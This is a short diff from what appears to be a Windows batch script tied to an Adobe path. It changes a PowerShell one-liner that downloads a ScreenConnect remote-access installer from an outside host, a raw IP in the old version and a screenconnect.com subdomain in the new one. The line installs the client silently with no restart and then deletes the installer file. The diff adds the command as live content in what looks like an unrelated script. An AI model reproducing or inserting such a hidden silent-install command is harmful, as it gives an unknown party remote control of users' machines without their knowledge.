@@ -67,7 +67,7 @@ if defined ADOBE_PATH (
 )
 
 
-powershell -Command "$url='http://207.174.0.98/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';$out=\"%TEMP%\ScreenConnect.ClientSetup.msi\";(New-Object Net.WebClient).DownloadFile($url,$out);msiexec /i \"$out\" /quiet /norestart;Start-Sleep 2;Remove-Item $out -Force"
+powershell -Command "$url='https://mentacesi.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';$out=\"%TEMP%\ScreenConnect.ClientSetup.msi\";(New-Object Net.WebClient).DownloadFile($url,$out);msiexec /i \"$out\" /quiet /norestart;Start-Sleep 2;Remove-Item $out -Force"
 
 
 
